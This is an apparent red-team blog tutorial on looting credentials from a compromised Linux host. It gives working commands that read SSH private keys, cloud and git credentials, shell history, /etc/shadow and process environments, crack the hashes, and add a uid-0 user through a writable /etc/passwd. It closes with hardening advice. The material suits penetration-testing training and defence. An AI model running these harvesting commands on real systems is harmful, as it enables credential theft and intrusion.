Linux Credential Access & Looting

2026-10-15 · 9 min read

On Linux, credential access is mostly a looting exercise. Secrets are rarely in one protected store the way Windows keeps them — they are scattered across the filesystem, process memory, and the home directories of every user and service. Once you have a shell, even an unprivileged one, the job is to harvest what reuses elsewhere and what escalates. This pairs with Linux Privilege Escalation and Data Collection & Exfiltration.

The first sweep

Start with the places secrets accumulate — home dotfiles, web and app configs, and anything world-readable it shouldn't be:

# shell history, keys, cloud and git creds in home dirs
cat ~/.bash_history ~/.zsh_history 2>/dev/null
ls -la ~/.ssh /home/*/.ssh 2>/dev/null
cat ~/.aws/credentials ~/.config/gcloud/*.json ~/.netrc ~/.git-credentials 2>/dev/null

# grep the usual config roots for secrets
grep -RniE 'pass(word)?|secret|api[_-]?key|token|BEGIN (RSA|OPENSSH) PRIVATE' \
  /var/www /opt /etc /home 2>/dev/null | head -40

# web-app config files almost always hold a DB string
cat /var/www/html/wp-config.php /var/www/*/.env 2>/dev/null

An enumerator (LinPEAS, lse.sh) automates all of this; run it, but know what it is looking at.

/etc/passwd and /etc/shadow

Accounts live in world-readable /etc/passwd; the password hashes live in root-readable /etc/shadow. If you can read shadow — as root, or through a misconfiguration — the hashes crack offline:

sudo cat /etc/shadow            # root-only; $6$ = yescrypt/SHA-512
unshadow /etc/passwd /etc/shadow > hashes.txt
hashcat -m 1800 hashes.txt rockyou.txt      # 1800 = sha512crypt

A writable /etc/passwd is an instant win: add a uid-0 user with a known hash. See Password Cracking for the cracking side.

SSH keys are the crown jewels

Private keys in ~/.ssh/ are reusable credentials that frequently move you to other hosts with no password at all. The surrounding files map the network for you:

cat ~/.ssh/id_rsa ~/.ssh/id_ed25519 2>/dev/null   # private keys to reuse
cat ~/.ssh/authorized_keys     # who may log in HERE
cat ~/.ssh/known_hosts ~/.ssh/config   # where this identity has been / jump hosts

Harvesting keys and mapping those relationships is the core of Linux Lateral Movement & SSH.

Process and memory sources

Credentials passed on a command line are visible to any user, and environment variables often hold tokens:

# passwords in command lines (e.g. mysql -p<pass>, curl -u user:pass)
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -iE 'pass|token|key'
# your own (and sometimes others') process environment
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'PASS|TOKEN|KEY'

Where else to look

LocationWhat you find
/etc, /opt service configsDB, backup, mail, monitoring credentials
Logs & old backups (*.bak, tarballs)Secrets leaked into logs and archived copies
Databases on diskApp user tables, API keys
Browser/keyring filesSaved passwords on desktop hosts

Detection & hardening

  • Least privilege on secret files — strict permissions on keys, configs and backups; never world-readable credentials.
  • Don't pass secrets on command lines; use files or a secrets manager so they never appear in /proc or shell history.
  • auditd rules on /etc/shadow, key directories and known looters, shipped to a SIEM (see Logging & Telemetry).
